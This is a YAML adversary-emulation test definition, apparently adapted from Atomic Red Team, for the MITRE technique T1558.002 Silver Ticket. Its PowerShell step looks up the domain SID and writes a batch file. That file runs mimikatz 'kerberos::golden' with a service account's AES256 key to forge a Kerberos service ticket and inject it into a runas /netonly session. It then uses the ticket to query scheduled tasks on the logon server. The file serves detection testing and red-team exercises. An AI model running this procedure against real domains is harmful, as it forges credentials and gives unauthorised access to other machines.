api_version: "2.0"
name: Crafting Active Directory silver tickets with mimikatz
description: |
    Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.
    The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
args:
    - name: service_aes256_key
      type: string
      default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
    - name: mimikatz_path
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
    - name: domain_sid
      type: string
      default: S-1-5-21-DEFAULT
    - name: domain
      type: string
      default: '%userdnsdomain%'
    - name: account
      type: string
      default: silverticketfakeuser
    - name: target
      type: string
      default: '%logonserver:\\=%'
uuid: 385e59aa-113e-4711-84d9-f637aef01f2c
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1558: Steal or Forge Kerberos Tickets'
    subtechniques:
        - 'T1558.002: Silver Ticket'
requirements:
    platforms:
        - os: windows
steps:
    - name: crafting-active-directory-silver-tickets-with-mimikatz
      inline: "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"{{.Args.domain_sid}}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to silver.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\silver.txt 2>&1 (\n  echo Purge existing tickets and create silver ticket:\n  klist purge\n  {{.Args.mimikatz_path}} \"kerberos::golden /domain:{{.Args.domain}} /sid:DOMAIN_SID /aes256:{{.Args.service_aes256_key}} /user:{{.Args.account}} /service:HOST /target:{{.Args.target}}.{{.Args.domain}} /ptt\" \"exit\"\n\n  echo.\n  echo executing:schtasks /query /S {{.Args.target}}.{{.Args.domain}}\n  schtasks /query /S {{.Args.target}}.{{.Args.domain}}\n  \n  echo.\n  echo Tickets after requesting schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Silver Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
